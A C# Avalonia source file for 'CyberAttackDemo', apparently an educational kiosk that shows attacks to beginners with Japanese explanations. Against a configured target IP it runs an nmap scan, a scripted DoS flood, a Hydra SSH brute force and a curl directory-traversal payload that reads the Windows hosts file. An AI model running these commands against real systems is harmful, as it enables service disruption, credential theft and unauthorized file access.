using Avalonia;
using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Threading;
using Avalonia.Media; // ブラシ（色）を使用するために必要
using CyberAttackDemo;
using System;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public partial class MainWindow : Window
    {
        private readonly ConfigManager _config;
        private readonly AttackEngine _engine;
        
        // 30秒無操作リセット用のタイマー
        private readonly DispatcherTimer _inactivityTimer;
        // 攻撃実行中などを判定するフラグ
        private bool _isBusy = false;

        public MainWindow()
        {
            InitializeComponent();
            
            _config = new ConfigManager();
            _engine = new AttackEngine();

            // エンジンからのログを受け取って画面に表示
            _engine.OnLogReceived += msg => Dispatcher.UIThread.Post(() => WriteLog(msg));

            this.KeyDown += OnKeyDown;
            this.Opened += OnWindowOpened;

            // --- 自動リセットタイマーの設定 ---
            _inactivityTimer = new DispatcherTimer
            {
                Interval = TimeSpan.FromSeconds(30) // 30秒
            };
            _inactivityTimer.Tick += (s, e) => 
            {
                // タイマー発火時にリセット実行（念のため一回止める）
                _inactivityTimer.Stop();
                OnResetClick(this, new RoutedEventArgs());
            };

            // ユーザー操作を監視してタイマーをリセットするイベント
            this.PointerMoved += OnUserActivity;
            this.Tapped += OnUserActivity;
            // KeyDownは既存のハンドラ内で処理
        }

        // ユーザーの操作があったらタイマーをリセット（延長）する
        private void OnUserActivity(object? sender, EventArgs e)
        {
            // 攻撃中（ビジー）でなければタイマーを再始動
            if (!_isBusy)
            {
                _inactivityTimer.Stop();
                _inactivityTimer.Start();
            }
        }

        private async void OnWindowOpened(object? sender, EventArgs e)
        {
            _config.Load();
            await _engine.EnsureAttackScriptExistsAsync();

            // デバッグモードの設定反映
            if (DebugInfoText != null)
            {
                DebugInfoText.IsVisible = _config.IsDebugMode;
            }

            // 初期化ログ
            WriteLog("SYSTEM INITIALIZED.", "system");
            WriteLog($"TARGET LOCKED: {_config.TargetIp}", "system");
            WriteLog($"SSH USER: {_config.SshUser}", "system");
            WriteLog($"ATTACK TIMEOUT SET TO: {_config.DdosDuration} SECONDS", "system");

            if (_config.IsDebugMode)
            {
                WriteLog("DEBUG MODE: ENABLED (Keys Active)", "system");
            }

            WriteLog("WAITING FOR USER AUTHORIZATION...", "system");
            
            if (TargetIpDisplay != null) TargetIpDisplay.Text = _config.TargetIp;

            // 監視開始
            _inactivityTimer.Start();
        }

        private void OnKeyDown(object? sender, KeyEventArgs e)
        {
            // ユーザーアクティビティとして処理
            OnUserActivity(sender, e);

            // デバッグモードが無効の場合、管理者用ショートカットを無効化
            if (!_config.IsDebugMode) return;

            if (e.KeyModifiers == KeyModifiers.Control && e.Key == Key.Q) Close();
            if (e.Key == Key.F11) ToggleFullScreen();
        }

        private void ToggleFullScreen()
        {
            if (WindowState == WindowState.FullScreen)
            {
                WindowState = WindowState.Normal;
                SystemDecorations = SystemDecorations.Full;
                Topmost = false;
            }
            else
            {
                WindowState = WindowState.FullScreen;
                SystemDecorations = SystemDecorations.None;
                Topmost = true;
            }
        }

        // --- フェーズ1: ポートスキャン ---
        private async void OnScanClick(object sender, RoutedEventArgs e)
        {
            SetBusyState(true, "ネットワークをスキャン中...", Brushes.Yellow);
            
            WriteLog("\n==========================================", "system");
            WriteLog($"[*] INITIATING PORT SCAN ON {_config.TargetIp}...", "system");
            WriteLog("==========================================", "system");

            await _engine.RunCommandAsync("nmap", $"-F -sV {_config.TargetIp}");

            WriteLog("\n[SCAN COMPLETE] ANALYZING VULNERABILITIES...", "system");
            
            // UI遷移
            if (Phase1Panel != null) Phase1Panel.IsVisible = false;
            if (Phase2Panel != null) Phase2Panel.IsVisible = true;
            if (ResetButton != null) ResetButton.IsVisible = true; // リセットボタンを表示
            
            // ★ここでリセットボタン等を有効化し、ビジー状態を解除する
            _isBusy = false;
            _inactivityTimer.Start(); // タイマー再開

            if (AttackSelector != null) AttackSelector.IsEnabled = true;
            if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
            if (ResetButton != null) ResetButton.IsEnabled = true; // リセットボタン有効化
            
            UpdateStatus("攻撃手段を選択してください。", Brushes.Red);
        }

        // --- フェーズ2: 攻撃実行 ---
        private async void OnExecuteClick(object sender, RoutedEventArgs e)
        {
            if (AttackSelector == null) return;

            int selectedIndex = AttackSelector.SelectedIndex;

            if (selectedIndex == 0) await RunDosAttack();
            else if (selectedIndex == 1) await RunBruteForce();
            else if (selectedIndex == 2) await RunDirectoryTraversal();
        }

        // --- DoS攻撃 ---
        private async Task RunDosAttack()
        {
            SetBusyState(true, "DoS攻撃を実行中...", Brushes.Red);
            WriteLog("\n==========================================", "system");
            WriteLog($"[*] INITIATING SHELL-SCRIPTED FLOOD ATTACK...", "system");
            WriteLog($"[*] DURATION LIMIT: {_config.DdosDuration} SECONDS", "system");
            WriteLog("[!] WARNING: EXTREME NETWORK LOAD.", "system");
            WriteLog("==========================================", "system");

            await _engine.EnsureAttackScriptExistsAsync();

            string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} dos";
            
            // カウントダウン付きで実行
            await RunCommandWithCountdown("bash", args, _config.DdosDuration);

            // 解説を追加
            WriteLog("\n------------------------------------------", "system");
            WriteLog("[解説] DoS攻撃 (Denial of Service) とは？", "system");
            WriteLog("ターゲットに対して大量のデータ(パケット)を送りつけ、処理能力や通信帯域を", "system");
            WriteLog("パンクさせることで、サービスを利用不能にする攻撃です。", "system");
            WriteLog("------------------------------------------\n", "system");

            WriteLog("\n[ATTACK STOPPED] SHELL SCRIPT TERMINATED.", "system");
            SetBusyState(false, "次の攻撃の準備完了");
        }

        // --- SSH攻撃 ---
        private async Task RunBruteForce()
        {
            SetBusyState(true, "パスワードクラック中...", Brushes.Red);
            WriteLog("\n==========================================", "system");
            WriteLog("[*] INITIATING SSH BRUTE FORCE ATTACK (Hydra)...", "system");
            WriteLog($"[*] USER: {_config.SshUser}", "system");
            WriteLog("[*] WORDLIST: Built-in (Top 5 common passwords)", "system");
            WriteLog("==========================================", "system");

            await _engine.EnsureAttackScriptExistsAsync();

            // 引数にユーザー名を追加: <IP> <DURATION> hydra <USER>
            string args = $"{AttackEngine.AttackScriptName} {_config.TargetIp} {_config.DdosDuration} hydra {_config.SshUser}";
            
            // Hydraは完了まで待つが、万が一のために設定時間+αで強制終了
            // カウントダウン付きで実行
            await RunCommandWithCountdown("bash", args, _config.DdosDuration + 30);

            // 解説を追加
            WriteLog("\n------------------------------------------", "system");
            WriteLog("[解説] SSHパスワードクラック (Brute Force) とは？", "system");
            WriteLog("ユーザー名とパスワードの組み合わせを辞書(リスト)から次々と試し、", "system");
            WriteLog("ログイン可能な認証情報を力ずくで割り出す攻撃です。", "system");
            WriteLog("------------------------------------------\n", "system");

            WriteLog("\n[ATTACK FINISHED] HYDRA SESSION COMPLETE.", "system");
            SetBusyState(false, "次の攻撃の準備完了");
        }

        // --- ディレクトリトラバーサル ---
        private async Task RunDirectoryTraversal()
        {
            SetBusyState(true, "ディレクトリトラバーサル攻撃を実行中...", Brushes.Red);
            WriteLog("\n==========================================", "system");
            WriteLog($"[*] INITIATING DIRECTORY TRAVERSAL ATTACK (ACTUAL)...", "system");
            WriteLog("[*] TARGET: Windows IIS / ASP.NET (Assumed)", "system");
            WriteLog("[*] PAYLOAD: vuln.aspx?file=../../Windows/System32/drivers/etc/hosts", "system");
            WriteLog("==========================================", "system");

            // 指定された攻撃URLに変更
            // http://<IP>/vuln.aspx?file=../../Windows/System32/drivers/etc/hosts
            string targetUrl = $"http://{_config.TargetIp}/vuln.aspx?file=../../Windows/System32/drivers/etc/hosts";
            string args = $"--path-as-is -v --max-time 5 \"{targetUrl}\"";
            
            WriteLog($"[*] Executing: curl {args}", "system");
            
            await _engine.RunCommandAsync("curl", args, 10);

            // 初心者向けの解説ログを実行後に移動
            WriteLog("\n------------------------------------------", "system");
            WriteLog("[解説] ディレクトリトラバーサルとは？", "system");
            WriteLog("Webサーバーの公開フォルダから '../' (親ディレクトリへ移動) を繰り返すことで、", "system");
            WriteLog("本来アクセスできないシステム内部のファイル(今回は 'hosts')を不正に閲覧する攻撃です。", "system");
            WriteLog("成功すると、上記のようにファイルの中身が表示されます。", "system");
            WriteLog("------------------------------------------\n", "system");

            WriteLog("\n[ATTACK FINISHED] Response received (or blocked by IDS).", "system");
            SetBusyState(false, "次の攻撃の準備完了");
        }

        // --- 実行ボタンのカウントダウン制御付きコマンド実行 ---
        private async Task RunCommandWithCountdown(string command, string args, int timeoutSeconds)
        {
            string originalText = "[実行]";
            if (ExecuteButton?.Content != null) originalText = ExecuteButton.Content.ToString()!;

            // タイマーキャンセル用のトークン
            using var cts = new System.Threading.CancellationTokenSource();

            // カウントダウンタスク（バックグラウンドで実行）
            var countdownTask = Task.Run(async () =>
            {
                int remaining = timeoutSeconds;
                while (remaining > 0)
                {
                    // 処理がキャンセルされていたらループを抜ける
                    if (cts.Token.IsCancellationRequested) break;

                    // UI更新 (ボタンのテキストを変更)
                    Dispatcher.UIThread.Post(() => 
                    {
                        if (ExecuteButton != null) ExecuteButton.Content = $"残り {remaining} 秒";
                    });

                    try 
                    {
                        await Task.Delay(1000, cts.Token);
                    }
                    catch (TaskCanceledException) { break; }
                    
                    remaining--;
                }
            });

            try
            {
                // コマンド実行（完了またはタイムアウトまで待機）
                await _engine.RunCommandAsync(command, args, timeoutSeconds);
            }
            finally
            {
                // コマンド終了後、カウントダウンを停止
                cts.Cancel();
                
                // ボタンのテキストを元に戻す
                Dispatcher.UIThread.Post(() => 
                {
                    if (ExecuteButton != null) ExecuteButton.Content = originalText;
                });
            }
        }

        // --- リセット ---
        private void OnResetClick(object sender, RoutedEventArgs e)
        {
            // UIスレッドで実行（タイマーから呼ばれた場合のため）
            Dispatcher.UIThread.Post(() => 
            {
                // ログコンテナの中身をクリア
                if (LogContainer != null) LogContainer.Children.Clear();
                
                if (Phase2Panel != null) Phase2Panel.IsVisible = false;
                if (Phase1Panel != null) Phase1Panel.IsVisible = true;
                if (ResetButton != null) ResetButton.IsVisible = false; 
                if (ScanButton != null) ScanButton.IsEnabled = true;
                
                _config.Load();
                if (TargetIpDisplay != null) TargetIpDisplay.Text = _config.TargetIp;
                
                UpdateStatus("待機中", Brushes.Yellow);
                WriteLog("SYSTEM RESET. READY.", "system");

                // リセット完了後、監視を再開
                _isBusy = false;
                _inactivityTimer.Start();
            });
        }

        // --- UI Helper Methods ---
        private void SetBusyState(bool isBusy, string statusText, IBrush? color = null)
        {
            _isBusy = isBusy;

            if (isBusy)
            {
                // 攻撃中は自動リセットタイマーを停止
                _inactivityTimer.Stop();

                if (ScanButton != null) ScanButton.IsEnabled = false;
                if (ExecuteButton != null) ExecuteButton.IsEnabled = false;
                if (AttackSelector != null) AttackSelector.IsEnabled = false;
                if (ResetButton != null) ResetButton.IsEnabled = false;
            }
            else
            {
                // 攻撃終了後はタイマー再開
                _inactivityTimer.Start();

                if (ScanButton != null) ScanButton.IsEnabled = true;
                if (ExecuteButton != null) ExecuteButton.IsEnabled = true;
                if (AttackSelector != null) AttackSelector.IsEnabled = true;
                if (ResetButton != null) ResetButton.IsEnabled = true;
            }
            UpdateStatus(statusText, color);
        }

        private void UpdateStatus(string text, IBrush? color = null)
        {
            if (StatusText != null)
            {
                StatusText.Text = $"状態: {text}";
                if (color != null) StatusText.Foreground = color;
            }
        }

        // 色付きログ出力ロジック
        private void WriteLog(string message, string forceType = "")
        {
            if (LogContainer == null || LogScrollViewer == null) return;

            var textBlock = new TextBlock
            {
                FontFamily = "Monospace",
                TextWrapping = TextWrapping.Wrap,
                FontSize = 16,
                Margin = new Thickness(0, 1, 0, 1)
            };

            // 1. システムメッセージ
            if (forceType == "system")
            {
                textBlock.Foreground = Brushes.Lime;
                textBlock.Text = message;
            }
            // 2. パスワード発見行のハイライト処理
            else if (message.Contains("password:") && !message.Contains("[ATTEMPT]") && !message.Contains("login tries") && !message.Contains("[試行中]"))
            {
                int passIndex = message.IndexOf("password:");
                if (passIndex >= 0 && passIndex + 9 < message.Length)
                {
                    string beforePass = message.Substring(0, passIndex + 9);
                    string passValue = message.Substring(passIndex + 9);

                    textBlock.Inlines?.Add(new Avalonia.Controls.Documents.Run { Text = beforePass, Foreground = Brushes.Lime });
                    textBlock.Inlines?.Add(new Avalonia.Controls.Documents.Run { Text = passValue, Foreground = Brushes.Cyan, FontWeight = FontWeight.Bold });
                }
                else
                {
                    textBlock.Foreground = Brushes.Lime;
                    textBlock.Text = message;
                }
            }
            // 3. 成功メッセージ
            else if (message.Contains("valid password found") || message.Contains("[成功]"))
            {
                textBlock.Foreground = Brushes.Cyan;
                textBlock.FontWeight = FontWeight.Bold;
                textBlock.Text = message;
            }
            // 4. エラーまたは失敗
            else if (message.Contains("[STDERR]") || message.Contains("ERROR") || message.Contains("Failed") || message.Contains("[失敗]"))
            {
                textBlock.Foreground = Brushes.Red;
                textBlock.Text = message;
            }
            // 5. 通常の成功/進行メッセージ
            else if (message.StartsWith("[*]") || message.StartsWith("[+]") || message.Contains("[発見]") || message.Contains("Process") || message.Contains("Vector"))
            {
                textBlock.Foreground = Brushes.Lime;
                textBlock.Text = message;
            }
            // 6. 通信ログや試行ログ（目立たなくする）
            else if (message.StartsWith("<") || message.StartsWith(">") || message.Contains("HPING") || message.Contains("[ATTEMPT]"))
            {
                textBlock.Foreground = Brushes.Gray;
                textBlock.Text = message;
            }
            // 7. その他
            else
            {
                textBlock.Foreground = Brushes.WhiteSmoke;
                textBlock.Text = message;
            }

            LogContainer.Children.Add(textBlock);
            LogScrollViewer.ScrollToEnd();
        }
    }
}
